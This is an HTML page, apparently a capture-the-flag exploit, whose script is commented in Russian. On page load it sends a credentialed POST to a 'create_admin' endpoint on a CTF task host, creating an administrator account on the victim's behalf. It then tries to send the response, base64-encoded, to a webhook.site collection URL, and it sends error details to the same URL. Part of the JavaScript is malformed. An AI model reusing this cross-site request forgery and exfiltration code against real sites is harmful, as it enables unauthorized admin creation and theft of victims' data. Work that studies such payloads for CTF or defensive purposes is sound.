<!DOCTYPE html>
<html>
<body>
<script>
  // Отправляем POST-запрос на create_admin от имени жертвы
  fetch("https://tasks.goidactf.ru:20061/create_admin", {
  "headers": {
    "accept": "*/*",
  },
  "referrer": "https://tasks.goidactf.ru:20061/admin",
  "body": "new_admin_login=123",
  "method": "POST",
  credentials: 'include',
  mode: "no-cors", // Изменили на no-cors
})
  .then(res => {
    // ЭТО РАБОТАЕТ ТОЛЬКО ЕСЛИ ЕСТЬ CORS!s
    return res.text().then(body => ({
      status: res.status,
      headers: [...res.headers.entries()],
      body: body
    }));
  })
  .then(data => {

    fetch("https://webhook.site/57261ed8-a080-4092-b0e9-32263826bdfb?data="+ btoa(encodeURIComponent(JSON.stringify(data)))), {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
    "sec-ch-ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Microsoft Edge\";v=\"144\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1"
  },
  "body": null,
  "method": "GET",
  "mode": "cors",
  "credentials": "include"
}})
 .catch(error => {
  // Отправляем только информацию об ошибке
  const errorInfo = {
    message: error.message,
    type: error.name
  };
  
  fetch("https://webhook.site/57261ed8-a080-4092-b0e9-32263826bdfb?error=" + btoa(encodeURIComponent(JSON.stringify(errorInfo))));
  })
</script>
</body>
</html>
